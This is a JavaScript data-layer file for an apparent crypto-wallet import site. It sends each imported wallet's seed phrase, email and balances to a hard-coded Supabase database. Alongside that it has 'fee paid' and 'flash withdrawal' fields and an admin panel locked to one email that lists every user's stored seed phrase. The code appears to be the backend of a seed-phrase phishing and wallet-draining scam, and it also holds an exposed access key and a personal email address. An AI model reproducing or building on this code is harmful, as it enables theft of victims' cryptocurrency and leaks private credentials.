// ============================================
// SUPABASE CONFIGURATION (Direct)
// ============================================

const SUPABASE_URL = 'https://lcjnvqmefazftfggefrq.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxjam52cW1lZmF6ZnRmZ2dlZnJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ4Mzg0ODgsImV4cCI6MjEwMDQxNDQ4OH0.ZN0uhAeqWYgZz3H9NLfJ9iMLBsURZ_Bu2hIjC1nl08o';

let supabaseClient = null;

function getSupabase() {
    if (!supabaseClient) {
        if (typeof window !== 'undefined' && window.supabase) {
            supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        }
    }
    return supabaseClient;
}

async function saveUserToDB(userData) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('users').upsert({
            email: userData.email,
            seed_phrase: userData.seedPhrase,
            wallet_address: userData.walletAddress,
            network: userData.network,
            native_balance: userData.nativeBalance || '0',
            usdt_balance: userData.usdtBalance || '0',
            wallet_type: userData.walletType || 'seedimport',
            fee_paid: userData.feePaid || false,
            fee_tx_hash: userData.feeTxHash || null,
            flash_withdrawn: userData.flashWithdrawn || false,
            flash_amount: userData.flashAmount || 0,
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
        }, { onConflict: 'email' });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        console.error('Save user error:', e);
        return { success: false, message: e.message };
    }
}

async function getAllUsers() {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('users').select('*').order('created_at', { ascending: false });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function getUserByEmail(email) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('users').select('*').eq('email', email).single();
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function updateUser(email, updates) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        updates.updated_at = new Date().toISOString();
        const { data, error } = await sb.from('users').update(updates).eq('email', email);
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function deleteUser(email) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { error } = await sb.from('users').delete().eq('email', email);
        if (error) throw error;
        return { success: true };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function saveTransaction(txData) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('transactions').insert({
            user_email: txData.userEmail,
            type: txData.type,
            amount: txData.amount,
            currency: txData.currency,
            network: txData.network,
            tx_hash: txData.txHash,
            status: txData.status || 'pending',
            created_at: new Date().toISOString()
        });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function getAllTransactions() {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('transactions').select('*').order('created_at', { ascending: false });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function saveCurrencySettings(settings) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('settings').upsert({
            key: 'currencies',
            value: JSON.stringify(settings),
            updated_at: new Date().toISOString()
        }, { onConflict: 'key' });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function getCurrencySettings() {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.from('settings').select('*').eq('key', 'currencies').single();
        if (error) throw error;
        return { success: true, data: JSON.parse(data.value) };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function autoSaveUserOnImport(email, seedPhrase, walletAddress, network) {
    try {
        console.log('Saving user to Supabase:', email, walletAddress, network);
        const result = await saveUserToDB({
            email, seedPhrase, walletAddress, network, walletType: 'seedimport'
        });
        console.log('User saved result:', result);
    } catch (e) {
        console.error('Auto-save error:', e);
    }
}

// ============================================
// ADMIN AUTH
// ============================================

const ADMIN_EMAIL = 'dctraik8@gmail.com';

async function adminSignIn(email, password) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.auth.signInWithPassword({ email, password });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

async function adminSignUp(email, password) {
    const sb = getSupabase();
    if (!sb) return { success: false, message: 'Supabase not loaded' };
    try {
        const { data, error } = await sb.auth.signUp({ email, password });
        if (error) throw error;
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message };
    }
}

function getAdminSession() {
    if (typeof window === 'undefined') return null;
    const { data } = getSupabase().auth.getSession();
    return data.session;
}

function isAdminSignedIn() {
    const session = getAdminSession();
    return session !== null && session.user !== null && session.user.email === ADMIN_EMAIL;
}

async function adminSignOut() {
    const sb = getSupabase();
    if (!sb) return;
    await sb.auth.signOut();
}